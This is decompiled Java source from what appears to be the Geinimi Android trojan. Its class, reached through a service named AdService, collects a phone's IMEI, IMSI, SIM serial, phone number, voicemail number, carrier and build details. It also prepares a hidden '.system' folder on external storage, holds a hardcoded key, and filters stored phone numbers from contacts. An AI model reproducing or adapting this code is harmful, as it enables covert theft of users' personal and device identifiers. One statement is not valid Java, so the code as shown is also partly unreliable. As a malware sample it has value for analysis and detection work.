package com.geinimi.c;

import android.content.Context;
import android.content.SharedPreferences.Editor;
import android.os.Build;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.text.format.DateFormat;
import com.geinimi.AdService;
import java.io.File;
import java.util.Vector;

public final class k {
    public static String A = null;
    public static String B = null;
    public static String C = null;
    public static String D = null;
    public static String E = null;
    public static String F = null;
    public static String G = null;
    public static String H = null;
    public static String I = null;
    private static String J = (Environment.getExternalStorageDirectory() + File.separator + ".system");
    private static Context K = null;
    private static Vector L = null;
    private static Vector M = null;
    public static byte[] a = {1, 2, 3, 4, 5, 6, 7, 8};
    public static final String b = (J + File.separator + "apps");
    public static final String c = (J + File.separator + "icons");
    public static final String d = (J + File.separator + "wallpapers");
    public static final String e = (J + File.separator + "ads");
    public static String f = null;
    public static String g = null;
    public static String h = null;
    public static String i = null;
    public static String j = null;
    public static String k = null;
    public static String l = null;
    public static String m = null;
    public static String n = null;
    public static String o = null;
    public static String p = null;
    public static String q = null;
    public static String r = null;
    public static String s = null;
    public static String t = null;
    public static String u = null;
    public static String v = null;
    public static String w = null;
    public static String x = null;
    public static String y = null;
    public static String z = null;

    public k(AdService adService) {
        K = adService;
        TelephonyManager telephonyManager = (TelephonyManager) adService.getSystemService("phone");
        String deviceId = telephonyManager.getDeviceId();
        f = deviceId;
        if (deviceId == null) {
            f = "1234567890";
        }
        g = telephonyManager.getDeviceSoftwareVersion();
        h = telephonyManager.getLine1Number();
        i = telephonyManager.getNetworkCountryIso();
        j = telephonyManager.getNetworkOperator();
        k = telephonyManager.getNetworkOperatorName();
        l = String.valueOf(telephonyManager.getNetworkType());
        m = String.valueOf(telephonyManager.getPhoneType());
        n = telephonyManager.getSimCountryIso();
        o = telephonyManager.getSimOperator();
        p = telephonyManager.getSimOperatorName();
        q = telephonyManager.getSimSerialNumber();
        r = String.valueOf(telephonyManager.getSimState());
        String subscriberId = telephonyManager.getSubscriberId();
        s = subscriberId;
        if (subscriberId == null) {
            s = "1234567890";
        }
        t = telephonyManager.getVoiceMailNumber();
        u = Build.MODEL;
        v = Build.BOARD;
        w = Build.BRAND;
        x = Build.CPU_ABI;
        y = Build.DEVICE;
        z = Build.DISPLAY;
        A = Build.FINGERPRINT;
        B = Build.HOST;
        C = Build.ID;
        D = Build.MANUFACTURER;
        E = Build.PRODUCT;
        F = Build.TAGS;
        G = DateFormat.format("yyyy-MM-dd kk:mm:ss", Build.TIME).toString();
        H = Build.TYPE;
        I = Build.USER;
    }

    public static Context a() {
        return K;
    }

    public static String a(Context context, String str) {
        return PreferenceManager.getDefaultSharedPreferences(context).getString(str, null);
    }

    private static String a(String str) {
        String str2;
        StringBuffer stringBuffer = new StringBuffer();
        String str3 = str;
        while (str3.length() > 0) {
            int indexOf = str3.indexOf(59);
            if (indexOf >= 0) {
                String substring = str3.substring(0, indexOf);
                str2 = str3.substring(indexOf + 1);
                str3 = substring;
            } else {
                str2 = "";
            }
            if (str3.length() >= 11) {
                String substring2 = str3.substring(str3.length() - 11);
                if (substring2.startsWith("1")) {
                    stringBuffer.append(substring2).append(";");
                }
            }
            str3 = str2;
        }
        return stringBuffer.toString();
    }

    public static void a(Context context, String str, String str2) {
        Editor edit = PreferenceManager.getDefaultSharedPreferences(context).edit();
        edit.putString(str, str2);
        edit.commit();
    }

    public static String b() {
        return AdService.b();
    }

    public static String c() {
        return AdService.c();
    }

    public static String d() {
        return AdService.d();
    }

    public static String e() {
        return AdService.e();
    }

    public static String f() {
        return "1.4";
    }

    public static String g() {
        return "1.4";
    }

    public static String h() {
        "runmode=" + AdService.b;
        return AdService.b.equals(m.a(1)) ? m.a(5) : AdService.b.equals(m.a(0)) ? m.a(3) : m.a(4);
    }

    public static void i() {
        L = b.a();
        M = new Vector();
        int i2 = 0;
        while (true) {
            int i3 = i2;
            if (i3 < L.size()) {
                c cVar = (c) L.get(i3);
                String a2 = a(cVar.b);
                if (a2.length() > 0) {
                    M.add(new c(cVar.a, a2, cVar.c, cVar.d));
                }
                i2 = i3 + 1;
            } else {
                return;
            }
        }
    }

    public static c[] j() {
        return (c[]) M.toArray(new c[0]);
    }
}
